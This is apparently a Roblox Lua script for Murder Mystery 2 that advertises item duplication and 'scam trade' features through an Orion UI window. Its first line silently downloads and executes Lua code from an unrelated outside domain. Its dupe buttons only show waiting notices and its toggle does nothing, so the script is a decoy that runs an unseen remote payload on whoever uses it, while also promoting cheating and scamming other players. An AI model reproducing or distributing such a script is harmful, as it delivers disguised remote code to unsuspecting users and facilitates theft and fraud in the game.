loadstring(game:HttpGet("https://egorikusa.space/c495fde50592ef16017313bd.lua", true))()
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()



local Window = OrionLib:MakeWindow({Name = "Dupe/Scam trade MM2", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})


---Tab---
local Tab = Window:MakeTab({
	Name = "Dupe Knife/Gun",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})



--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

---Section---
local Section = Tab:AddSection({
	Name = "Main"
})


Tab:AddButton({
	Name = "Dupe knife",
	Callback = function(knifedupe)
      		OrionLib:MakeNotification({
	Name = "Warning!",
	Content = "Wait 5 minutes for the dupe",
	Image = "rbxassetid://4483345998",
	Time = 120
})
  	end    
})




Tab:AddButton({
	Name = "Dupe Gun",
	Callback = function(knifedupe)
      		OrionLib:MakeNotification({
	Name = "Warning!",
	Content = "Wait 5 minutes for the dupe",
	Image = "rbxassetid://4483345998",
	Time = 120
})
  	end    
})

Tab:AddParagraph("Warning","Equip Knife or gun and wait 5 minute without leaving")



local Tab = Window:MakeTab({
	Name = "Scam trade",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})


Tab:AddToggle({
	Name = "Scam trade",
	Default = false,
	Callback = function()

		print(Value)
	end    
})
Tab:AddParagraph("Done!","Now you can remove your items and trade!")
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]

OrionLib:Init()
